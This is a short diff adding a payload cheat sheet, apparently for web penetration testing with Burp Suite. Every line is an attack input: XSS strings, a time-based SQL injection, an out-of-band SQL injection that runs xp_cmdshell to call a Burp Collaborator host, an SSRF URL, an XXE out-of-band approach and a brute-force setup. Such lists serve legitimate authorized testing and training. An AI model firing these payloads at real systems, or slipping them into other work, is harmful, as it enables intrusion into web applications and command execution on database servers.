@@ -1,0 +1,7 @@
+Быстрые payload-карточки (типичные)
+XSS (reflected): <script>alert(1)</script>; "><svg/onload=alert(1)>
+SQLi (time-based): ' OR IF(1=1,SLEEP(5),0)--
+SQLi (OOB): '; exec master..xp_cmdshell('nslookup unique.burpcollab.net')--
+SSRF: http://<your-collab>.burpcollab.net/
+XXE (OOB): добавляем внешнюю DTD, reference на collaborator
+Auth brute: username list + password list (Intruder, Pitchfork/Cluster Bomb as needed)
